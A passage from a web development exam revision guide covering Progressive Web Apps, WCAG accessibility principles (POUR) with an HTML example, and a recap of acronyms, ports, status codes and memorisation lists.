Five named future developments: **Edge AI** ("AI at the edge, closer to where data is generated, for low-latency processing"); **Explainable AI (XAI)**; **AI for AR and VR**; **AI for healthcare and life sciences**; **quantum machine learning**.

### Progressive Web Apps

*Note: **PWAs have no lecture deck.** The Week 12 Summary is entirely about them and the Week 12 deck does not mention them once. The bullets below are the course's whole content on the topic; the mechanism paragraph after them is **not from the course deck**.*

The Summary's bullets: PWAs "combine the strengths of both **web and mobile apps**"; they are "built on the principle of **progressive enhancement**, ensuring they work for everyone, from basic web browsers to the most advanced devices"; they offer "**reliability**, **instant loading even in low or no network conditions**, and an app-like experience with smooth animations, gestures, and **offline access**"; they are "**responsive**, adapting to different screen sizes and orientations", and offer "**push notifications** to engage users". Named benefits: improved user experience, broader accessibility, reduced development costs, enhanced performance. **Named real-world examples: Twitter Lite, Flipkart, Starbucks, Trivago** — memorise all four; a "give examples of successful PWAs" question is exactly the sort of thing a summary-derived paper asks.

**Service workers** are named in the Summary as the enabling technology: they "enable **offline access**, **caching resources** for faster loading times, and providing **push notifications** to re-engage users even when the app is not open."

*Not from the course deck:* a service worker is a JavaScript file the browser runs on a separate thread, outside any page, acting as a programmable network proxy. It intercepts every `fetch` from the app and may answer from a cache instead of the network — which is what makes offline access possible. A PWA also needs a **web app manifest** (a JSON file giving the app's name, icons, start URL and display mode, so it can be installed to the home screen) and **HTTPS**, which service workers require. Those three — service worker, manifest, HTTPS — are the standard checklist, and the course names only the first.

### Where people go wrong

- **WebAssembly does not replace JavaScript.** It complements it for computationally heavy work. The deck frames it as addressing JavaScript's performance limits, not superseding the language.
- **"Serverless" does not mean there is no server.** It means the provider manages it. Say so explicitly; markers look for it.
- Forgetting **cold starts** and **vendor lock-in**. They are the only challenges the course names, so a "benefits and challenges" question is half unanswered without them.
- **Supervised vs unsupervised** is **labelled vs unlabelled** data. That single word is the whole distinction.
- Assuming Week 12's deck and Summary describe the same subject. They do not: revise **both** the deck's four topics (WebAssembly, serverless, AI, accessibility) **and** the Summary's PWAs.
- Week 12's learning objectives are entirely about accessibility and WCAG, while three-quarters of the deck is about WebAssembly, serverless and AI. That mismatch is in the course material itself.

### In the exam

Likely, from the mid-lesson questions: "How can WebAssembly benefit a project requiring real-time video processing?" — answer with near-native performance from compiling heavy code to Wasm, and the deck's own example of real-time filters and background blur in a video conferencing app. And "Compare the benefits and challenges of serverless architecture versus traditional server-based approaches" — auto-scaling, cost-efficiency and faster development against cold starts and vendor lock-in. From the Summary: "What are Progressive Web Apps and what characteristics define them?" and "Name four real-world examples of successful PWAs."

Memorise: **Wasm = WebAssembly**; **FaaS = Functions as a Service**; **cold starts, vendor lock-in**; **ML / AI / NLP / XAI**; **supervised = labelled, unsupervised = unlabelled**; **PWA = Progressive Web App**; **service workers**; **Twitter Lite, Flipkart, Starbucks, Trivago**.

---

## Part 21 — Web accessibility and inclusivity (Week 12)

### What it is, in the slides' terms

"**Web accessibility** refers to the practice of ensuring that websites, web applications, and web content are **usable by people with disabilities**. **Inclusivity** goes beyond accessibility and encompasses designing and developing web technologies to be **inclusive of all users, regardless of their abilities or disabilities**."

Three terms: **disabilities** — "**visual, auditory, motor, cognitive**, or other impairments that affect a person's ability to access web content"; **WCAG (Web Content Accessibility Guidelines)** — "provides a set of **guidelines and success criteria** for creating accessible web content"; **A11Y** — "a **numeronym** for 'accessibility'". (A11Y is "a", eleven letters, "y" — the kind of trivia that makes a good one-mark question.)

### The four accessibility principles — POUR

The deck gives four principles, each with a definition and an example. This is the most examinable list in Week 12, and the initials spell **POUR**:

| Principle | Definition | Deck's example |
|---|---|---|
| **Perceivable** | Information and UI components must be presented so they can be perceived by all users | Providing **alternative text for images** for screen reader users |
| **Operable** | Users must be able to navigate and interact using various input methods, including keyboard and voice | Ensuring all interactive elements are **keyboard accessible** |
| **Understandable** | Content should be clear and easy to understand for all users | Using **plain language** |
| **Robust** | Sites should work with current and future technologies, ensuring longevity | Using **semantic HTML** to structure content |

Note how "robust" ties back to Part 9's semantic elements, and "perceivable" to the `alt` attribute — the course is closing its own loop.

### Tools and technologies

Five named: **screen readers** ("converts text and visual content into **speech or Braille**"); **voice recognition software**; **keyboard navigation**; **closed captions and subtitles** ("textual alternatives for audio content, benefiting deaf and hard-of-hearing users"); **colour contrast tools** ("ensure sufficient contrast between text and background colours").

### Challenges and emerging trends

Five named **challenges**: **technological gaps** (accessibility across devices, browsers and assistive technologies); **awareness and education** (educating developers and designers); **retrofitting vs inclusive design** ("deciding between retrofitting existing websites or incorporating accessibility from the start"); **regulatory compliance** — with two named laws, the **Americans with Disabilities Act (ADA)** and the **Web Accessibility Directive** in Europe; **testing and user feedback** ("regularly testing with users who have disabilities").

Five named **emerging trends**: **AI-powered accessibility tools** ("auto-generating image descriptions"); **Voice User Interfaces (VUIs)**; **AR and VR accessibility**; **inclusive design systems**; **global collaboration**.

### Concrete example

*Reconstruction — the deck states each principle abstractly. Mapped onto markup, the four principles are four concrete habits:*

```html
<!-- PERCEIVABLE: alternative text, so a screen reader can describe it -->
<img src="chart.png" alt="Enrolment rose from 400 to 1,200 between 2021 and 2024">

<!-- OPERABLE: a real button is keyboard-focusable and Enter-activated.
     A <div onclick> is not, which is why the deck says use proper tags. -->
<button type="submit">Submit application</button>

<!-- UNDERSTANDABLE: an associated label, so the field announces its purpose -->
<label for="matric">Matriculation number</label>
<input type="text" id="matric" name="matric">

<!-- ROBUST: semantic HTML, so assistive technology can identify regions -->
<nav aria-label="Main">...</nav>
<main>...</main>
<footer>...</footer>
```

### Where people go wrong

- Giving three principles instead of four, or inventing a fifth. **POUR** is the mnemonic.
- Treating accessibility and inclusivity as synonyms. The deck distinguishes them: accessibility is about **people with disabilities**; **inclusivity goes beyond it** to all users regardless of ability.
- Naming WCAG levels A, AA and AAA. **The course never mentions them.** WCAG here is "a set of guidelines and success criteria" and nothing more. Do not build an answer around conformance levels.
- Reducing accessibility to `alt` text. That is one example of one principle out of four.
- In practice you would reach for ARIA attributes and automated auditing tools. **ARIA is not named in this course.** Answer with the four principles and the five named tools.

### In the exam

Very likely, straight from the learning objectives: "Generate the key guidelines and success criteria outlined in WCAG" — answer with **Perceivable, Operable, Understandable, Robust**, each with a definition and an example. Also likely: "State five tools and technologies that support web accessibility"; "Discuss the challenges of implementing web accessibility"; "What is inclusivity and how does it differ from accessibility?"

Memorise: **WCAG = Web Content Accessibility Guidelines**; **POUR**; **A11Y**; **ADA = Americans with Disabilities Act**; **VUI = Voice User Interface**; screen readers, voice recognition, keyboard navigation, closed captions, colour contrast tools.

---

## Recap: everything nameable in one page

### Acronyms and expansions

| | | | |
|---|---|---|---|
| **HTML** | HyperText Markup Language | **XML** | eXtensible Markup Language |
| **SVG** | Scalable Vector Graphics | **MathML** | Mathematical Markup Language |
| **XHTML** | Extensible HyperText Markup Language | **CSS** | Cascading Style Sheets |
| **JS** | JavaScript | **DOM** | Document Object Model |
| **ES6** | ECMAScript 6 / ECMAScript 2015 | **IIFE** | Immediately Invoked Function Expression |
| **JSON** | JavaScript Object Notation | **AJAX** | Asynchronous JavaScript and XML |
| **CORS** | Cross-Origin Resource Sharing | **SPA** | Single Page Application |
| **PWA** | Progressive Web App | **URL** | Uniform Resource Locator |
| **URI** | Uniform Resource Identifier | **HTTP** | Hypertext Transfer Protocol |
| **HTTPS** | Hypertext Transfer Protocol Secure | **SSL** | Secure Sockets Layer |
| **TLS** | Transport Layer Security | **FTP** | File Transfer Protocol |
| **SFTP** | SSH / Secure File Transfer Protocol | **SSH** | Secure Shell |
| **SMTP** | Simple Mail Transfer Protocol | **POP3** | Post Office Protocol version 3 |
| **IMAP** | Internet Message Access Protocol | **MIME** | Multipurpose Internet Mail Extensions |
| **MX** | Mail Exchanger (DNS record) | **DNS** | Domain Name System |
| **DNSSEC** | DNS Security Extensions | **TLD** | Top-Level Domain |
| **gTLD / ccTLD** | generic / country-code TLD | **DDoS** | Distributed Denial of Service |
| **REST** | Representational State Transfer | **SOAP** | Simple Object Access Protocol |
| **CRUD** | Create, Read, Update, Delete | **TCP / IP** | Transmission Control Protocol / Internet Protocol |
| **API** | Application Programming Interface | **DBMS** | Database Management System |
| **RDBMS** | Relational DBMS | **SQL** | Structured Query Language |
| **ACID** | Atomicity, Consistency, Isolation, Durability | **ERD** | Entity-Relationship Diagram |
| **ORM** | Object-Relational Mapping | **MVC** | Model-View-Controller |
| **DRY** | Don't Repeat Yourself | **CoC** | Convention over Configuration |
| **LAMP** | Linux, Apache, MySQL, PHP | **PHP** | Hypertext Preprocessor |
| **VCS** | Version Control System | **IDE** | Integrated Development Environment |
| **SQLi** | SQL Injection | **XSS** | Cross-Site Scripting |
| **CSRF** | Cross-Site Request Forgery | **WAF** | Web Application Firewall |
| **CSP** | Content Security Policy | **HSTS** | HTTP Strict Transport Security |
| **2FA / MFA** | Two-factor / Multi-factor Authentication | **IDS** | Intrusion Detection System |
| **VPS** | Virtual Private Server | **CDN** | Content Delivery Network |
| **CI** | Continuous Integration | **VM** | Virtual Machine |
| **AWS / GCP** | Amazon Web Services / Google Cloud Platform | **EC2** | Elastic Compute Cloud |
| **AMI** | Amazon Machine Image | **VPC** | Virtual Private Cloud |
| **IAM** | Identity and Access Management | **RBAC** | Role-Based Access Control |
| **Wasm** | WebAssembly | **FaaS** | Functions as a Service |
| **ML / AI** | Machine Learning / Artificial Intelligence | **NLP** | Natural Language Processing |
| **XAI** | Explainable AI | **WCAG** | Web Content Accessibility Guidelines |
| **A11Y** | Accessibility (numeronym) | **ADA** | Americans with Disabilities Act |
| **VUI** | Voice User Interface | **CMS** | Content Management System |

### Port numbers

*(Not from the course deck — no slide gives a port number. Learn them anyway.)*

| Port | Service | Port | Service |
|---|---|---|---|
| 20 | FTP data | 21 | FTP control |
| 22 | SSH / SFTP | 25 | SMTP (relay) |
| 80 | HTTP | 110 | POP3 |
| 143 | IMAP | 443 | HTTPS |
| 465 | SMTPS (legacy) | 587 | SMTP submission |
| 993 | IMAPS | 995 | POP3S |

### HTTP status codes

*(Not from the course deck.)* **1xx** informational · **2xx** success · **3xx** redirection · **4xx** client error · **5xx** server error. Individually: **200** OK · **201** Created · **204** No Content · **301** Moved Permanently · **302** Found · **304** Not Modified · **400** Bad Request · **401** Unauthorised · **403** Forbidden · **404** Not Found · **429** Too Many Requests · **500** Internal Server Error · **502** Bad Gateway · **503** Service Unavailable · **101** Switching Protocols (the WebSocket upgrade).

### Named standards, bodies, dates and people

**ARPANET** · **Sir Tim Berners-Lee, 1989** · **Brendan Eich** (JavaScript) · **ECMAScript 2015 (ES6)**, the sixth major version · **HTML5** (native multimedia, `canvas`, dynamic graphics) · **WCAG** · **DNSSEC** · **MIME** · **SSL/TLS** · **ADA** and the European **Web Accessibility Directive** · **HTTP/2** (named only in the reference list).

### The lists to be able to recite

- **Four document components:** DOCTYPE, `<html>`, `<head>`, `<body>`.
- **Five markup languages:** HTML, XML, SVG, MathML, XHTML.
- **Four email standards:** SMTP (send/relay), POP3 (download and remove), IMAP (keep and sync), MIME (format).
- **SMTP commands:** HELO, MAIL FROM, RCPT TO, message content.
- **Four DNS levels:** root, TLD, second-level, subdomain.
- **Four server types:** web, database, application, proxy.
- **Four client–server steps:** URL/click → HTTP request → server processes and responds → browser renders.
- **Five CSS selectors:** type, class, ID, universal, descendant.
- **Four box model components:** content, padding, border, margin.
- **Flexbox:** `flex-direction` row / row-reverse / column / column-reverse; `justify-content` flex-start / flex-end / center / space-between / space-around / space-evenly; `align-items` flex-start / flex-end / center / baseline / **stretch (default)**; `flex: grow shrink basis`.
- **Five DOM selection methods:** getElementById, getElementsByClassName, getElementsByTagName, querySelector, querySelectorAll.
- **Three DOM node types:** element, attribute, text.
- **Four event components:** event source, event type, event listener, event object.
- **Three async mechanisms:** callbacks, promises, async/await.
- **Seven ES6 features:** let/const, arrow functions, template literals, destructuring, spread and rest, classes, modules.
- **Five jQuery features:** DOM manipulation, event handling, AJAX, animation, cross-browser compatibility.
- **Three JS libraries:** jQuery, Lodash, Moment.js. **Three frontend frameworks:** React, Angular, Vue.js. **Four backend frameworks:** Django, Express.js, Ruby on Rails, ASP.NET.
- **Seven PHP data types:** string, integer, float, boolean, array, object, NULL. **Three PHP scopes:** local, global, static.
- **Five backend languages:** Python, Ruby, PHP, Node.js, Java.
- **Five DBMSs:** MySQL, PostgreSQL, Oracle (RDBMS); MongoDB (NoSQL document); Redis (in-memory key-value).
- **Seven API development steps:** define purpose, design, implement, test, document, secure, version.
- **Five vulnerabilities:** SQL injection, XSS, CSRF, injection attacks, security misconfigurations.
- **Seven security best practices:** input validation, output encoding, authentication and authorisation, session management, security headers, regular updates, security testing.
- **Four hosting options:** on-premises, cloud, VPS, shared.
- **Five performance techniques:** load balancing, caching, CDNs, database optimisation, front-end optimisation.
- **Four accessibility principles:** **P**erceivable, **O**perable, **U**nderstandable, **R**obust.
- **Four PWA examples:** Twitter Lite, Flipkart, Starbucks, Trivago.

### The five places the course is wrong or contradicts itself

1. **"POST sends data securely to the server"** (Week 3). POST is not encrypted; only HTTPS is.
2. **Client-side validation "can check if a username is already taken without waiting for the server"** (Week 6). Impossible; uniqueness is server-side knowledge.
3. **REST filed under "Web Communication Protocols"** while the same slide calls it an architectural style (Week 2).
4. **React called a library on one slide and grouped under frameworks on the next** (Week 8); the Week 8 Summary does both too.
5. **The box model total described as the element's width** when it includes margin (Week 4) — the arithmetic is right, the wording is not.

Plus two smaller ones: **Django's pattern is MVT, not MVC**, though the deck says MVC and you should answer MVC; and the **Week 5 Summary's skills list is copy-pasted from Week 4** and names CSS competencies for a JavaScript lesson.
